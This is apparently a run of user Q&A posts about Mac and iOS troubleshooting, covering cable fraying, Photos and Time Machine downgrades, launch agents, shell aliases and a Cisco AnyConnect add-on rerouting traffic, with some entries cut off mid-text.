It is quite famous that users posted frayed lightning cable or Macbook Power Adapter cable on the Internet or Tumbler. Here is for Google image for lightning, and another one for the Power Adapter.\nUsers' reviews on the Power Adapter on the Apple website: \"Horrible adapter... end up fraying\", \"The cable frayed on me\", \"cable is frayed\", \"It frays like crazy\", \"they fray at the end\", \"fray way too easily\".\nHow about users' reviews on the lightning cable on the Apple website? \"begin to fray\", \"frayed very easily\", \"Poor quality, frays easily\", \"frayed and the internal wires are exposed\", \"It frayed\", \"frayed and damaged\".\nPersonally, I have used several Dell or Compaq notebook computers and their adapters, and their power cords have never frayed. The webcam can be of lower quality, and the fan can be noisy, but the $29 adapter never had a frayed cable. One the other hand, iPhone's 30-pin cable, lightning cable, Macbook Power Adapter cable have all frayed on me.\nWhenever I talked to an Apple Store associate, they all said, for 5, 6 years, their cable never had any problem. I do not know whether it is some script the company told them to read out, or whether they are told to claim so, but people I know had this problem, my relatives had this problem, I saw YouTuber wrapping styrofoam sheet near the Magsafe end to prevent it from fraying, and if half of the people found it good and half of the people found it bad, the review of lightning cables won't be near the minimum possible: either 1.5 star when the lowest possible rating is 1 star, or a 2 star. The same goes for its Macbook Magsafe 2 Power Adapter. \nIs it actually under warranty?  Because one store did replace it before, and another store said it is not covered.\n\nBy the way, some users may say they have some cable they have for 10 years and they never had a problem. Now, if the cable is laid flat, all straight on a desk, I won't be surprised they don't have a problem for 10 years. But, what if the power outlet or USB outlet is in front, and you need to plug in to the iPhone and see it upright -- then now the cable has a U-turn. Are Apple cables not supposed to have a U-turn?  What about power outlet or USB to the left or right side of the table, now your iPhone or Macbook is connected, and the cable may have a 90 degree turn. Are all brands of cable out there able to have a 90 degree turn, except Apple's cable?\nSome user requested a photo. If it is lightning, I should have thrown it away because I ended up buying the Anker Powerline II from Amazon anyways. At around $12-17, it is reasonable, and because sometimes I need 6 feet or 10 feet anyways.  The $79 Macbook Power Adapter, since Apple didn't replace mine, I already threw it away. They are the ones of bigger concern, because you can't replace the cable, but you have to replace the whole power adapter transformer part, and it is $79, or $86.11 including tax. But I can tell how it looks like: it was all pristine and it was only broken \"skin\", somewhat similar to the photos below. Like I said, none of any other brands cable had fraying issue for me. Only Apple's does.  The photos that I can find online that are similar to the situations I had before:\n\n\n\nA: According to Apple One (1) Year Limited Warranty – Accessory:\n\nThis warranty excludes normal depletion of consumable parts such as\n  batteries unless failure has occurred due to a defect in materials or\n  workmanship and, damage resulting from abuse, accident, modifications,\n  unauthorized repairs or other causes that are not defects in materials\n  and workmanship.\n\nThis is the term that Apple store or service providers often rely on to reject warranty of cases like you mentioned. They could say it was caused by abusive usage behavior, or by accident thus violate the warranty term.\nIf you are specifically looking to confirm has Apple ever issued a recall/repair program for frayed lightning cable then the answer is No.  \n\nA: The only sure way to find out is simply to ask Apple whether or not they'll cover your specific cables under warranty.\nThere's no general rule that frayed cabled must be under warranty - on the other hands, there's also no general rule that they are not under warranty.\nDepending on the laws in your particular country, it is often so that if the frayed cables are due to a manufacturing defect (i.e. something that existed before you bought the product), or comes about due to normal use within the warranty period, then it is to be covered by warranty. That is not the same thing, however, as Apple actually covering it under warranty. Then you have to decide whether it is worth fighting for a replacement cable, or just buying the next cable from somewhere else.\nIn terms of addressing the actual, practical problem of frayed cables - it is important to treat  any properly - i.e. take care when you roll them up, don't put too much strain on them, make sure to disconnect the cable by pulling on the actual plug and not on the cable, etc.\nAs to why these cables are different from other manufacturers - I have heard an explanation, which I cannot verify, which state that many other manufacturers use the material soft PVC (a type of plastic) and Apple does not due to environmental concerns. I do know that PVC is often highly recycable, but there could be other concerns.\n", "Q: How to copy the current text line without highlighting it? I find it annoying that I have to highlight a given piece of text and then press CMD +C to copy it into the buffer. \nI want to be able to copy text by simply pressing CMD +C, which would copy the whole line on which my cursor is placed. \nHow do I accomplish this?\n\nA: The closest to what you are looking for is triple-click on the line and CMD+C that highlights and copy the whole line.\nOn certain code editors a piece of text is copied just by highlighting it.\n", "Q: Photo library won't import back on Mojave after Catalina I have downgraded to Mojave after the automatic installation of Catalina that have given me a lot of problems.\nNow I have a Photo library that won't open back on mojave.\nIt's a 178GB library and I need it back.\nIs there a way to do that?\n\nA: I can offer you a work around.\n\n\n*\n\n*Go to you Pictures folder\n\n*Right click your Photos library, \"Show Package Contents\"\n\n*All photos are in the \"Masters\" folder. Create a new Photo library and import.\n\n\nAt 178GB I'm guessing you have some level of organization, folders, etc. I'm unsure if that's recoverable.\n\nA: The database underlying the Photos library is different in Catalina and Mojave (and again in Big Sur). To convert a Catalina library into Mojave, open it on a Mac running Catalina, enable iCloud photos and upload all the photos to iCloud. Then sign into this iCloud account on a Mac running Mojave, enable iCloud photos and sync. Since you have a rather large library, you'll need to subscribe to a suitable iCloud plan, the minimum duration is 1 month.\nTo just extract the photos from the Catalina library, the options are:\n\n*\n\n*Get the original photos (without edits) from the Masters folder\nof your Catalina Photos library, then import into a new Mojave Photos library.\n\n*Export photos along with edits and metadata as explained\nhere, but they'll all go into one big folder without organization.\n\n*Use a third party app such as Photos Takeout to export photos in year-wise folders. You can include or exclude metadata, edits etc., and preserve arrangement of photos in albums. As you have a Catalina Photos library, the app must be installed on a Mac running Catalina (It won't read a Catalina library on a Mojave Mac). Then import the folders into Photos on your Mac running Mojave.\n\n", "Q: Universal (MacOS and iOS) iCloud path to file? Is there a way to get a universal path to a file in the iCloud directory? That is, a way to copy a path to a file stored in iCloud which will correctly direct to the file whether you use the path on iOS or MacOS?\nSpecifically, I'd like to link to an iCloud file in my Bear note taking app. However, I want this link to correctly function whether I use it from my Mac or from my iOS devices. Is there a way I can get such a link?\nEdit:\nIdeally, a solution which also works offline would be best. For example, on the Mac, a link such as file:///Users/username/Library/Mobile Documents/com~apple~Preview/Documents/my_file.pdf will reveal the linked file. However, this doesn't work on iOS. An equivalent link which works both on iOS and MacOS would be the ideal case. The first solution provided works as a device agnostic link, however, it does require an internet connection.\n\nA: Not sure if this will do exactly what you want, but here's how to get a link to a file stored in iCloud:\nOn your Mac:\n\n\n*\n\n*In Finder, open your iCloud Drive (found in the Go menu or Shift+Command+I)\n\n*Right click on the file and choose Share > Show People\n\n*Expand Share Options and adjust permissions as needed\n\n*Click Copy Link\nOn your iPhone/iPad:\n\n\n*\n\n*Go to the Files app\n\n*Tap the file to open it\n\n*Tap the share icon (bottom left)\n\n*Tap Add People\n\n*Adjust Share Options as needed\n\n*Tap Copy Link\nOn the web:\n\n\n*\n\n*Go to Drive on iCloud\n\n*Click to highlight the file\n\n*Click the Add People icon in the top menu bar\n\n*Click Copy Link\n\n*Adjust permissions and click Share\n\n*The shareable URL will shown\n\n\nA: For iOS you can use this, for example:\n\"/var/mobile/Library/Mobile Documents/\"\n", "Q: Disable the do not disturb banner on iOS 13 notification centre I like do not disturb, however, I updated my iPhone to iOS 13 and now there is a banner every time I turn on do not disturb. I know I turned on do not disturb, I don't want the banner.\nHow do I make the banner go away?\n\n\nA: There is no way. \nWhen you swipe right on most notifications, there are the three options Manage, View, and Clear/Clear All. Manage is the one we are worried about, as it can permanently stop notifications. \nSwiping right on the Do Not Disturb notification, though, only reveals two options, View and Clear. This shows there is no way to permanently disable it.\n\nA: Swipe right on the Do Not Disturb Notification to clear it.\n", "Q: How to keep a process running on the terminal after locking/logging out? Research:\nFound no links on internet where someone was able to make it happen. Most answers go round and round without providing a working solution. I'm starting to believe that this is not possible on a Mac.\n\nQuestion:\nI have some scripts that runs tests, build code etc. I want to be able to start the script and \"lock\" my machine and go home for the day, while the tests continue running behind the locked screen.\nHowever, the moment the screen is locked, the terminal processes just pause. They continue again as soon as I log back in. So the machine just stays powered on the whole night, doing nothing.\nIs there a way to be able to run my scripts with locked screen. Note that I'm only locking the screen (control + command + Q) and not even logging out (shift + command + Q). However, the moment the screen is locks out, the tests simply pause.\n\nMost likely this is a safety thing implemented to prevent the machine from not running out of the battery in case there is a power outage. Is there a way I can get around this?\n\nA: I believe that this has something to do with power savings settings. There is slider for \"Turn display off after:\" and by default \"Prevent computer from sleeping automatically when the display is off\" option is not selected. \nMaybe caffeinate can help (prevent the system from sleeping on behalf of a utility). 'man caffeinate' for more information.\n\nA: For me, this is a working solution:\n\n*\n\n*Check power settings, don't go to sleep / Don't turn off display\n\n*Start \"caffeinate\" or \"amphetamine app\"\n\n*Enable \"Ask for password on screensaver immediately\" in System preferences → Safety\n\n*Start your command\n\n*Start your screensaver\n\nYour screen is locked, but the command is still executing.\nYou can start your screensaver with a better touch tool action or a keyboard shortcut with automator.\n", "Q: iCloud allows access to files via direct link without authentication!

Adobe Creative Cloud being one of them (well, many of them).\nI know there is an Creative Cloud Uninstaller but it is 32-bit so won't run on Catalina. I've downloaded the most recent but after running it quits with errors (and doesn't seem to do a thing).\nIs there a list of every CC file that Adobe spewed throughout my filesystem so I can delete them manually?\n\nA: Fully removing Creative Cloud\nBasically, you need to look for files in the following folders: \n /Library/Application Support/Adobe\n~/Library/Application Support/Adobe\n /Library/LaunchAgents\n~/Library/LaunchAgents\n~/Library/Preferences\n\nHowever, removing CC without breaking other Adobe apps is kinda challenge... \nThe conservative way\nIf CC annoys you but you have the space for it (a couple of MB) and you are not willing risking to destroy your Adobe environment. I would recommend to simply disable it from being loaded at boot. To do so: \nsudo lauchctl unload -w /Library/LaunchAgents/com.adobe.AdobeCreativeCloud.plist\n\nTo be sure it is done, redoing the command above should return:\n/Library/LaunchAgents/com.adobe.AdobeCreativeCloud.plist: Could not find specified service\n\n", "Q: Command works when run from alias but not when typed?

For example (one of mine):\nalias ipex='curl -s http://ipecho.net/plain'\n\nOr, in your case:\nalias s4='sshfs 10.xxx.xx.4:/Users/username/code mountpoint'\nalias s8='sshfs 10.xxx.xx.8:/Users/username/code mountpoint'\n\nand so on.\nYou may use more complex aliases, or even personal functions used inside aliases, for example when you need to pass a parameter inside the command, not at the end (as to provide a changing IP address to your alias), but it is probably a bit too much depending on your question.\nAnyway, this is one of mine, again:\n# Delete an existing alias, but only if it exists in order to avoid an error:\ndont_alias() {\n    alias $1 >/dev/null 2>&1 && unalias $1\n    return $?\n} # dont_alias\n\nThen I use dont_alias as an alias, for example:\ndont_alias s4 # Will unalias the existing s4\ndont_alias s7 # Will do nothing\n\nThe only difference with aliases is that functions do not appear in the list of (existing) aliases.\nI have a few more complex samples (that I use daily), if some people are interested.

These are scans of old photos so the modification dates don’t match when the photos were taken anyway.\nIt almost works but some photos get a date one hour too early. That looks like a time zone problem except that the photos have no location information, so I can’t tell where it would come from.\ntell application \"Photos\"\n    set currentAlbum to album named \"Album name\"\n    -- Start with a date slightly in the past, based on the album size.\n    set currentAlbumCount to (count of media items in currentAlbum)\n    set photoDate to (current date) - currentAlbumCount\n    repeat with currentItem in media items in currentAlbum\n        set photoDate to photoDate + 1\n        set date of currentItem to photoDate\n    end repeat\nend tell\n\nAfter running this, the EXIF for photos has the time/date for some being an hour earlier than others-- e.g. one at 4:16:13 pm, the next one at 3:16:14, then 4:16:15, with no apparent reason why some are off by an hour.\nI’m trying to do this because when I export and use the photos in other places (like Google photos) they get sorted by date, and I want to preserve the sort order.\n\nA: It seems that the problem is that Photos doesn't edit all EXIF date tags when the script above runs, and Google Photos looks at tags that Photos doesn't change. Photos doesn't seem to have any other options for editing dates so I had to dig deeper. As @CJK described in comments, EXIF dates are a bit of a mess so it's necessary to edit the EXIF directly.\nI ended up exporting the album from Photos and writing a custom shell script to change the dates. I used @CJK's suggestion of exiftool. The script follows. If you don't understand it, don't use it, because it has no error checking.\n#!/bin/bash\n\n# First export photos from Photos.app to a directory.\n# - Export as \"sequential\".

Importing songs fails with error \"Copying files failed. An unknown error occured (-54)\".\nThe problem goes away if I choose Preferences / Files / Copy Files to Music Media folder when adding to library: No, but resurfaces when I then choose File / Library / Organize Library / Consolidate files.\nSo this looks clearly like an issue in relation to file access permissions. I did't change from the defaults, and e.g. my Music/iTunes has \"Read & Write\" only for \"Me\", which seems readanable.\nIs this a known issue (apparently not known to Google in this particular incarnation at this point) and how can it be remedied? I prefer a \"conservative\" solution in terms of granting additional access rights.\n\nA: The following procedure removed the problem:\n\n\n*\n\n*In Finder, select /Users/myaccount/Music/iTunes, the \"Get Info\".\n\n*Current permissions are me: Read & Write, system: Read & Write, wheel: Read only, everyone: Read only. (I apparently mad a mistake in the earlier observation that only me had Read & Write permission there.)\n\n*Select \"Apply to enclosed items\".\n\n", "Q: Why does \"what's my IP\" show a strange / random IP and not my home fibre IP? When I try ifconfig.co or whatismyip.com on my MacOS 10.4 I get a completely unknown IP address and it even changes every day or two.\nTried from Safari, Brave, Firefox and even did curl ifconfig.co from the terminal and all show the same IP, currently somewhere in the US (and I'm nowhere near the US) but as I said it changes occasionally to other IPs.\nI don't have any proxies set (checked both in Network settings, and in Firefox), the default route shown by netstat -rn points to my home router, but still somehow my traffic gets routed through these weird IP addresses.\nI'm not aware of any VPN running either.\nWhat's causing it? What should I check? \n\nA: Usually in a typical home setup, you'll have \"internal\" IP-addresses on your home network. Technically known as RFC1918-addresses, they look like this:\n10.0.0.0 - 10.255.255.255\n  172.16.0.0 - 172.31.255.255\n  192.168.0.0 - 192.168.255.255\nThese addresses are only used on your local network in your house, or possible also in a smaller part of your provider's network.\nYour internet provider uses various forms for address translation to convert these to globally routable (i.e. useable on the Internet) addresses. Therefore the address others on the Internet perceive as yours is not the same as you see configured on your local computer.\nRegarding the country information there's two major sources of errors there:\nFirstly, the actual determination of which country an IP address \"represents\" is not accurate, but based on various information published by providers for other reasons. Therefore it might be you're in for example France, but your IP-address is listed as Belgian, because the internet provider you have has their headquarters in Belgium and uses that postal address for their IP-registration.\nSecondly, your traffic might leave your provider's network at different locations depending on destination, time of day, how much capacity is currently used by others, etc. Therefore if you look at traceroutes, it might look as if your traffic \"appears\" to originate in the US or in Japan, or other places even when you're nowhere near those places.\n\nA: It turns out it's a Cisco AnyConnect feature called Web Security Addon. \nEven though my Cisco VPN client was off this addon was still intercepting all my traffic and was sending it to that big brother service for inspection. It was pretty intrusive, even setting up a non-Cisco VPN or setting a Proxy in the network settings didn't stop it from interfering.\nFortunately I've got admin access on my MacBook so I was able to follow these instructions, removed /opt/cisco/anyconnect/bin/plugins/libacwebsec*, rebooted my Mac and now the network works as expected.\nHope this helps someone :)\n", "Q: What happened to my books in iPad update? My books got uploaded to iCloud and then disappeared. Can't find my 1000+ PDFs and epubs anywhere. I turned on an off, syncing, but to no avail. I updated iOS to 13.3, and the Apple Books automatically started uploading all my books to iCloud. The books were more than 15GB, and I had only 4 GB left in iCloud. I had the syncing turned off. But with the update to 13.3 iOS, it turned the syncing on, and now I have no way to find or retrieve my books. Walla! Magic. Great 'Jobs', Apple.\nCan someone help me get my books back? Thank you.\n\nA: I had a similar problem since iOS 13, but only on my iPad not my iPhone.\nI have about 500 books and I like the bookshelf view. After the iOS 13 update, several of the books disappeared. The rectangle for the cover view was still there, but it was blank. When I clicked on it, nothing happened except that the app froze.\nThe problem seemed to be with books on iCloud, not those stored locally.\nI tried various things:\n\n\n*\n\n*Switching off syncing for Reading now brought them back - for a short time\n\n*I deleted the app and reinstalled it. The books displayed correctly as the books downloaded from iCloud but when downloading was complete, they disappeared again.\n\n\nIn the end, changing to the list view seems to be a workaround!

The Update only updated to a version of 60. There seems to be no Update option.\nThere is apparently a version of 68 which does NOT have this problem BUT disables most of my Add-ons.\nIt seems I have a choice of displaying unread email OR working Add-ons (which is the whole point of Thunderbird).\nMaybe I should try another email client (I find the side by side display of Mail unusable)\n", "Q: Can I still use time machine if I encrypt my drive with file vault? I read somewhere that there are some problems with the time capsule if you encrypt your mac, so I would like to know those before I do that.\n\nA: Yes, you can still use Time Machine backups even if you encrypt the boot drive with FileVault.\nNote that when setting up Time Machine backups, you'll have to select that the backup should be encrypted as well, otherwise your data will be stored unencrypted in the Time Machine backup.\n", "Q: .ZIP from Windows to Mac: folder structure lost - how to avoid that? I am creating .zip-files on windows that I want to make available to Mac-Users (created with ZipFile.CreatefromDirectory from .NET Core). However, when I extract these files on my Mac (running Mojave, using the context-menu's \"Extract File\"), it re-creates the source-folder that I had zipped - and a flattened structure in side that folder: where I previously had root\\foo\\bar.txt, I now have a file \"foo\\bar.txt\" in the root-folder. How I can get a \"foo\" folder with \"bar.txt\"? Did that problem arise when I build the .zip or do I need to extract differently in order to preserve directory-structure?\n\nA: The default install of macOS does not have an \"Extra File\" context menu - it seems like that could be a third party program / plugin. \nThe default install of macOS comes with the Archive Utility for uncompressing for example ZIP files. It will preserve folder structure by default.\nSo in your case, either you're using a third party extractor, that does not by default preserve folder structure, or you have made a mistake when making the compressed file.\nI would test by building a small test folder structure on the Mac, then select the top folder in Finder and choose \"Compress\" from the context menu. Now you'll have a ZIP-file that you can try uncompressing in a different folder. This should create the same folder structure that you initially compressed.\n", "Q: Is there a difference between launching an app from /Applications vs /System/Volumes/Data/Applications? I noticed that since updating to macOS 10.15, I get duplicate search results for some apps (due to the new read-only filesystem).\nIf we take Spotify as an example, is there any difference between launching either of:\n\n\n*\n\n*/Applications/Spotify.app\n\n*/System/Volumes/Data/Applications/Spotify.app\nor is the second option semantically equivalent to a symlink?\nClarification My question is not why there is a second folder, or why I get duplicate search results. My question is whether there is any difference in behaviour when looking at how apps from the two file locations are treated by the system (for example, does macOS impose additional restrictions on apps launched from /System/Volumes/Data?), or whether they can be treated as identical.\n\nA: Treat them as identical. There is no functional difference in finder or another program opening either path to the same Application bundle. You have only one Spotify app despite it showing up at two distinct POSIX paths.\nIt is not a sym link but a hybrid combination of two filesystem links that is presented as the path /Applications on Catalina. \nI would say the closest analog would be a hard link on OS prior to Catalina, but firm links are new to Catalina and are not the same as symbolic or hard links. \nYou’ve chosen the strangest folder in existence on Catalina since it’s a hybrid / illusion as named in the most superb technical discussion on this idea I’ve seen:\n\nThe old folder containing main apps, which used to be /Applications, now contains a mixture of apps from two different folders, /System/Applications, which is on the System volume and contains Apple’s bundled apps, and the Applications folder on the Data volume, which would otherwise be found at /System/Volumes/Data/Applications. When you install your own apps, they automatically get placed in the latter folder, as it’s the one which you can write to. When you view the /Applications folder in the Finder, though, you are actually seeing the combined contents of both folders, an illusion which is created by the firmlink at /Applications and the Finder.\n\n\n\n*\n\n*https://eclecticlight.co/2019/10/11/macos-catalina-boot-volume-layout-revised-for-10-15-release/\nApple technical documentation is also plentiful, but not as detailed or readable as the Eclectic Light blog post.\n\n\n*\n\n*What's /System/Volumes/Data?\n\nA: Catalina introduces a new way of managing the storage of the core OS/applications vs \"user space.\"  Everything that is \"stock\" is kept segregated from the \"user\" space, which in turn is now identified as \"Data\" and is mounted at \"/System/Volumes/Data.\"  This can be seen in Disk Utility's \"volumes\" view.\nFinder's Applications folder basically is an amalgamation of /System/Applications as well as anything installed in 'user' space, in this case \"/System/Volumes/Data/Applications\".  Running an app from either location makes no difference as they are the same file.\nHowever they are functionally different insofar as the user should only be able to modify items within the confines of /System/Volumes/Data/Applications.  Anything installed by a user will end up in that location as well (for example try ls /System/Volumes/Data/Applications, and compare with /System/Applications).   \n", "Q: Should activity monitor be using non-trivial CPU %? I noticed my Mac Mini was thrashing the fac despite not really running much, in the process of trying to figure out why I was surprised to see Activity Monitor itself bouncing around 8-12% CPU.\nIs this expected?\n\n\nA: Yes, it is expected. It has a lot to keep track of sometimes, and in the scheme of things, 8%-12% CPU is rather trivial. I've never seen it spike the CPU all by itself in years of looking at it.\n", "Q: How can avoid to open the apps that I was using on my last session when I start the Mac?

He also has Macs and an Apple Watch. He is also paying for iCloud. I also own an iPhone but he is the true Apple power user and he can play me any way he wants to.

To be clear, you can never be 100% certain.\nHowever, the closest you can get (without him losing all his other data*) is to arrange a get together with him at his home (without any indication as to why) and then be there with him as he:\nOn his Mac\n\n\n*\n\n*logs into his Mac and shows you the photos in the Photos app and, while doing so, make a note of some of the filenames of those photos and videos and then sit there as he deletes all of the items you want deleted\n\n*shows you his Photos app preferences by going to Photos > Preferences and pay particular attention as to what, if anything, is enabled in terms of iCloud and then disable these\n\n*goes into Finder and empties the Trash (or Bin, depending on version of macOS)\n\n*also in Finder, get him to press the command + shift + . keys at the same time so that hidden files are visible and then use commandF to search his Mac for the filenames you made note of at Step 1 to see if any had been saved elsewhere and, if so, get him to go to those locations and delete them all before emptying the Trash again\n\n*shows you what other user accounts he has on his Mac (this is done by going to Apple > System Preferences > Users & Groups) and, if he has other accounts, getting him to:\n\n\n*\n\n*log into each of them and show you what is in the Photos app (if anything) and repeat the first four steps above\n\n\n\nOn his iPhones/iPads\n\n\n*deletes the photos from all his iPhones, iPads etc (including the Recently Deleted album afterwards), and making sure you check any albums he has created (incl.

But it runs after login, so it is not an option.\nIs there any alternative to LaunchDaemons to run scripts or programs that allow WindowServer access?\n\nA: PreLoginAgents\nmacOS supports the ability to run graphical applications pre-login:\n\nRunning Agents Before Login\nMost software that displays a user interface does not run prior to the user logging in. However, in some rare cases, it may be necessary to create a graphical agent that does.\nBy default, OS X does not allow any application to draw content prior to login. If you need to do so, your agent must call the setCanBecomeVisibleWithoutLogin: method on its windows. For more information, see the documentation for that method and the PreLoginAgents sample code.\n\nThe trick is to add the following lines to your /Library/LaunchAgents  launchd plist:\n<key>LimitLoadToSessionType</key>\n<string>LoginWindow</string>\n\nThe executable must be stored in /Library/PrivilegedHelperTools.\nWe used this ability to show a notification window pre-login for Power Manager pending events.\nThis functionality may not be supported in the latest macOS; we have not relied on it for a long while.\n", "Q: Opened iPhone SE wrong - screen with lines and no video I just yanked my phone screen a little when opening my SE.

This seems like a real mess-up by Apple.\n\nA: Annoyingly, this seems to have been a problem with the initial release of macOS Catalina that disappeared when I installed the just-released Catalina update and rebooted. I tried all the steps mentioned in @ankii's answer (some of which were formerly in the comments), and unfortunately they didn't work, although evidently they have worked for many people in the past for problems very similar to this. Perhaps Apple quietly fixed this issue with the latest Catalina update, or it was a combination of the update and some of the previously-attempted steps.\nHopefully between these two answers, others who come across this question should find their solution!\n\nA: In such events where a problem arises due to multiple reasons, answers look like troubleshoot efforts. Cleaning up the comments, here's what I did on Mojave for an IMAP account:\n\n\n*\n\n*\n*\n\n*Back up the relevant folder under ~/Library/Mail/ and then delete the original folder associated with the troubling account. \n\n*Hide the ~/Library/Mail/ from Spotlight index using Spotlight Preferences -> Privacy and revealing hidden folders in Finder layover.\n\n\n\n\n\n\n\n*\n\n*Restart Mail and wait for all the mails to get downloaded. And remove the said folder from Privacy in Spotlight Preferences. Let the indexing be complete. If anything breaks, use the backup folder. \n\n\n*\n*\n\n*Do step one(backup) of above and take screenshots of Mail Preferences in case account specific settings like \"rules\" break down. \n\n*In Internet Accounts in System Preferences, remove the account. Wait for some reasonable time, and add it back. \n\n*Again if anything breaks(as OP says, smart mailboxes, not for me), replace the new folder under ~/Library/Mail/V6 with the backed up one. \n\nA: corespotlightd may be causing this.\nStarting with macOS Catalina (10.15), Apple moved the indexing of Mail messages files from traditional Spotlight to a daemon called corespotlightd. Unfortunately, it looks like that this piece of software has some bugs that lead to\n\n*\n\n*Mail search delivering incomplete results\n\n*Mail search not working any more at all\n\n*Mail not finding tagged emails any more\n\n*Smart mailboxes not working any more\n\nI've had severe problems like this from occasionally to frequently even still in the current macOS Monterey 12.4 when I finally identified corespotlightd being the bad guy.\nThere is a simple check if corespotlightd is causing your problem, and that's also how to fix it:\n\n*\n\n*open Activity Monitor\n\n\n*search for the process called corespotlightd\n\n\n*Terminate it\n\n\n\n*When asked Do you really want to quit \"corespotlightd\"?, you must answer Force Quit, because a simple Quit won't actually terminate the daemon\n\nThe corespotligthd daemon will automatically be restarted, and Mail search should work again instantly without the need to restart the Mail app.\nOf course, this is not a permanent fix. The problem can (and probably will) re-occur until Apple finally fixes it.\n", "Q: How can I prevent Music app from starting automatically randomly? The Music app which was introduced in Catalina continuously starts automatically on my Mac. It launches suddenly while I use the mac. The system doesn’t launch the app at the time of the startup.\nI tried the followings:\n\n\n*\n\n*Shutdown and restart the system.\n\n*SMC and PRAM reset.\n\n\nThe Music app cannot be deleted so it is very frustrating to see the app start automatically and play the music. \nIs there any way to stop it from launching automatically? This question is not about the app being launched when you plug your iPhone to your Mac either. \n\nUPDATED\nI found out that Siri is also launched from time to time. \nUPDATED 2\nFor Siri, I disabled it from System Preferences and it stopped popping up. However, the Music app keeps popping up and there is no solution yet. \n\nA: I have had this experience and I discovered that my finger was lightly brushing the \"Play\" button on the MacBook Pro's Touchbar. If the current app has no hook for that button, it seems that macOS now choses to launch the Music app.\nThe solution should be to run launchctl unload -w /System/Library/LaunchAgents/com.apple.rcd.plist. See this howtogeek for details.\nAlternatively, you can use noTunes from Tom Taylor to prevent iTunes or Apple Music from launching automatically.\n\nA: This answer prevents Music.app from opening on startup, which is what the OP originally asked before editing the question.\nThere are three ways (that I know of).\nThe first method is going to System Preferences -> Users and Groups -> Login Items\nand clicking the - button when selecting an application to remove it from startup.\nThe second method is to right-click the application in your Dock, then uncheck Options -> Open At Login.\nThe final method is going to Finder, LaunchDaemons in:\n\n/System/Library/LaunchDaemons\n\nand deleting the .plist file for the music app.\nYou may also need to remove it from:\n\n/Library/LaunchAgents\n\n\nA: I found this in github and it works as expected on Catalina:\nhttps://github.com/tombonez/noTunes\nEnjoy!\n\nA: I have a MacBook Pro (Retina, 15-inch, Mid 2014).\nI had this problem when I was using wired headphones in the headphone socket. The Music app would start automatically when my finger brushed that side of the case, as if it thought that I had pressed the headphones 'play' button.  I tried different brands of headphones but it did not solve the problem.  I believe this may be related to the issue of current leaking into the case (How can I avoid my MacBook Pro giving me minor shocks?).  The power socket is close to the headphone socket.\nThe only workaround I could find was to switch to bluetooth headphones (which maybe is what Apple is pushing for!)\n\nA: *\n\n*Open the music app.\n\n*Go to Music pulldown menu.\n\n*Select Restrictions.\n\n*Disable Music Options, Apple Music, iTunes Store, Shared Libraries\n\n*Click OK.\n\n*Close Apple Music.\n\nRestrictions Deselect\nThis worked for me on MacOS Catalina v10.15.7, 2019 - MacBookPro.\n\nA: Deleting all the songs from Music app has helped me to overcome this issue. I just opened the Music app, selected songs, right click, delete and sent to bin.\nIt's possible for me as I do not listen songs, I know for many of us this solution is not an option.\n\nA: For those who are using Keyboard Maestro you can create a simple macro that will instantly close Apple Music when it starts. It is almost the same way as how noTunes works, but one app less.\nYou can find the macro source file here.\n\n\nA: Disabling Handoff Feature\nFirst, you will want to try disabling the Handoff feature. You will need to:\nGo to Settings > General > Airplay and Handoff.\nToggle Handoff to OFF.\nSwitching this feature off can aid in the removal of your iPhone’s memory that you had played music on your phone.\n", "Q: Restore Shell configuration and packages I just formatted my Mac. I have a backup of my latest status before the format, and I want only one thing from this backup. I want my terminal to be exactly as it was. Mainly I want to have all the commands running (e.g. brew, nom, l (instead of ls), ...). furthermore, I want all the themings and terminal styling.\nIs there a way to do it not by using migration assistance?\n\nA: *\n\n*To get the styling and some other things back simply extract Backups.backupd/$COMPUTERNAME/latest/$SYSTEMVOLUME/Users/$USER/Library/Preferences/com.apple.Terminal.plist from the backup and copy it to /Users/$USER/Library/Preferences/\n\n*To get the shell config copy Backups.backupd/$COMPUTERNAME/latest/$SYSTEMVOLUME/Users/$USER/.bash_profile (and/or .profile/.bashrc) to /Users/$USER/. If you prefered another command interpreter (e.g. zsh) in the past, choose the respective files. Same with history files/folders like .bash_history and .bash_sessions.\n\n*I don't advise to copy anything from Backups.backupd/$COMPUTERNAME/latest/$SYSTEMVOLUME/usr/local/bin to get your brew packages back. Instead check Backups.backupd/$COMPUTERNAME/latest/$SYSTEMVOLUME/usr/local/var/homebrew/linked and Backups.backupd/$COMPUTERNAME/latest/$SYSTEMVOLUME/usr/local/opt and install the listed packages one by one with brew. The keg-only dependencies will be installed automatically.\nEntering brew bundle dump in Terminal before formatting the drive and moving the result to a save place, would have helped to restore your old brew enviroment on your current system.\n\n*Check Backups.backupd/$COMPUTERNAME/latest/$SYSTEMVOLUME/usr/local, .../bin and .../sbin for other binaries installed independently.\n\n\nwith\n\n\n*\n\n*$COMPUTERNAME: the computer name before formatting\n\n*$SYSTEMVOLUME: the name of the system drive before formatting\n\n*$USER: your user name before formatting\n\n\n\nAlmost all files and folders are invisible because they start with a dot or they are flagged invisible. So either use the AppleShowAllFiles YES feature or a decent file browser (like Path Finder).\n", "Q: Why is the sort feature always grayed out in the Podcasts app on MacOS Catalina? No matter what screen I'm on, it's always the same.... unable to sort.  Why even include the feature at all?  Is this a bug?\n\n\nA: I'm going to say it's a Catalina bug.  I have 10.15 and have dozens of different podcasts downloaded.\nI couldn't get those menu items to be enabled.

I recently upgraded to Catalina but after a few surprises I went back to Mojave using a Time Machine backup to restore data. I use Google to sync contacts on my Mac and iOS devices, and Gmail runs fine in the Mac mail app. I've done this for several years and its worked flawlessly ... until I went back to Mojave.\nI’ve had no problems with contacts in Mail but after I restored Mojave I noticed contact names in Messages on the Mac weren't showing - just phone numbers and conversations. When I checked Contacts on the Mac all of my Contacts had disappeared (they're still on my iPhone, iPad and safely at Google). \nIn Mojave if I open Internet Accounts in System Preference the Gmail account has Contacts ticked. I’ve ticked and unticked. No difference.\nWhen I try to add a CardDav account in Internet Accounts Google won’t verify my username and password even though they’re correct.\nStrangely, when I open Contacts, and then Enter Time Machine, I can successfully go back to an earlier time and see all the Contacts. However, when I click Restore, and watch the animation bring them all back - the animation ends with a pause and all the Contacts disappear before my eyes leaving an empty Contacts app with the words \"No cards\".\nAny advice on how to get my Google contacts back in the Contacts app on Mac Mojave would be most appreciated.\n\nA: This fixed my problem Fix corrupted Contacts database\n", "Q: Restore Time Machine Backup on an older OS I have currently made a backup of my MacBook running with Catalina. I then reinstalled Mojave and am now trying to find out if there is a way to restore the data, which I have backed up without automatically updating back to Catalina. \nDoes anyone know a way to \"exclude\" the restoring of the OS or alternatively  pre-select which parts of the Time Machine backup should be included? \nSidenote: Unfortunatelly, I lost my old 